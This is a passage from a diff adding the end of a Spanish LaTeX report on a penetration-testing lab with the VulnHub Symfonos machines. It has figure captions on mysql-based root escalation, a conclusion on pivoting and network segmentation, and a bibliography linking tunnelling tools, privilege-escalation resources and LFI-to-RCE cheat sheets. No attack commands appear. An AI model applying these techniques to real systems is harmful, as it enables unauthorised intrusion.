+\includegraphics[width=0.9\textwidth]{Images/66.png}
+\caption{Información de GTFObins para escalar con mysql}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{Images/67.png}
+\caption{Evidencia de escalada de privilegios a Root}
+\end{figure}
+
+\newpage
+
+\section{Conclusión}
+
+Este ejercicio ha sido una buena oportunidad para poner en práctica técnicas de pivoting entre distintos equipos Linux 
+y comprobar cómo, con una primera intrusión, se puede ir ampliando el acceso dentro de una red interna. 
+A medida que se avanzó, se logró establecer túneles, enumerar servicios internos y explotar equipos que 
+inicialmente no eran accesibles desde el exterior.\\
+
+Más allá de la parte técnica, el ejercicio deja claro lo importante que es proteger la segmentación de la red y 
+tener controles de detección para este tipo de movimientos laterales. También demuestra que conocer bien las 
+herramientas y los fundamentos del sistema es clave para moverse con soltura en entornos reales y entender 
+cómo piensan los atacantes.
+
+\section{Bibliografía}
+
+\textbf{Componentes de laboratorio}\\[2pt]
+
+Enlace de descarga de ParrotOS: \url{https://www.parrotsec.org/download/}\\
+
+Enlace de descarga de la máquina Symfonos1: \url{https://www.vulnhub.com/entry/symfonos-1,322/}\\
+
+Enlace de descarga de la máquina Symfonos2: \url{https://www.vulnhub.com/entry/symfonos-2,331/}\\
+
+Enlace de descarga de Vmware Workstation:\url{https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion}\\ \\
+
+\textbf{Herramientas}\\[2pt]
+
+Enlace de descarga de Chisel: \url{https://github.com/jpillora/chisel/releases}\\ \\
+
+\newpage
+
+\textbf{Manuales e información relevante}\\[2pt]
+
+Enlace a video de S4vitar para resolver el laboratorio completo:\url{https://www.youtube.com/watch?v=L1jSoCcvRY4&t=5838s}\\
+
+Repositorio de Github de escalada de privilegios en Linux:\url{https://github.com/Ignitetechnologies/Linux-Privilege-Escalation?tab=readme-ov-file}\\
+
+Recurso web sobre RCE a través de Local File Inclusion en general:\url{https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet}\\
+
+Recurso web sobre RCE a través de Local File Inclusion por SMTP\url{https://liberty-shell.com/sec/2018/05/19/poisoning/}\\
+
+\end{document}
